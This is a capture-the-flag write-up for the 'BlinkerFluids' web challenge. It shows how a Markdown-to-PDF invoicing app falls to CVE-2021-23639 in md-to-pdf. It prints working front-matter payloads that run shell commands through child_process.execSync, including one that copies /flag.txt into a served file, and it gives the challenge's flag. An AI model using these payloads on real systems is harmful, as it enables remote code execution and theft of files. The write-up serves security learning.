# Web 2: BlinkerFluids
> Once known as an imaginary liquid used in automobiles to make the blinkers work is now one of the rarest fuels invented on Klaus' home planet Vinyr. The Golden Fang army has a free reign over this miraculous fluid essential for space travel thanks to the Blinker Fluids™ Corp. Ulysses has infiltrated this supplier organization's one of the HR department tools and needs your help to get into their server. Can you help him?


#### Difficulty: ★☆☆☆

We are given a zip file that contains the source code for the BlinkerFluids™ invoicing system and access to a running instance of it.
After extracting the zip, I checked the package.json file to see the dependencies. `md-to-pdf` stood out as it is not something I frequently encounter. Based on the Dockerfile, the flag is located on `/flag.txt` of the system.
I googled for CVEs concerning `md-to-pdf` and found [CVE-2021-23639](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-23639) and the [snyk page](https://security.snyk.io/vuln/SNYK-JS-MDTOPDF-1657880) which contains a POC for **Remote Code Execution (RCE)**:

```
const { mdToPdf } = require('md-to-pdf');
var payload = '---jsn((require("child_process")).execSync("id > /tmp/RCE.txt"))n---RCE';
```


I tried pasting the payload directly to the invoice field, but I was met with a client-side error message. To further debug the problem, I built the docker image locally using the included `build-docker.sh` and ran it.
The payload was causing the following error:
`gray-matter engine "jsn((require("child_process")).execSync("id > /tmp/RCE.txt"))n---RC" is not registered`
I checked [gray-matter's github repo](https://github.com/jonschlinkert/gray-matter/blob/master/lib/engines.js), where I found the list of engines and changed the payload to:

```
---javascript
((require("child_process")).execSync("id > /tmp/RCE.txt"))
---RCE
```

which I was able to verify by checking the /tmp/ directory on the running container.
Knowing that the flag is in `/flag.txt`, I changed the payload to:

```
---javascript
((require("child_process")).execSync("cp /flag.txt /app/static/invoices/b1d6a00c-f6f4-43f8-a959-41dd5cdbb998.pdf"))
---RCE
```

which copies the flag.txt file to an invoice pdf that I generated prior. Afterwards, I just opened the pdf, which threw an error as it isn't a pdf anymore, and checked the Sources tab via Chrome dev tools, which contained the contents of the fake pdf:

`HTB{bl1nk3r_flu1d_f0r_int3rG4l4c7iC_tr4v3ls}`
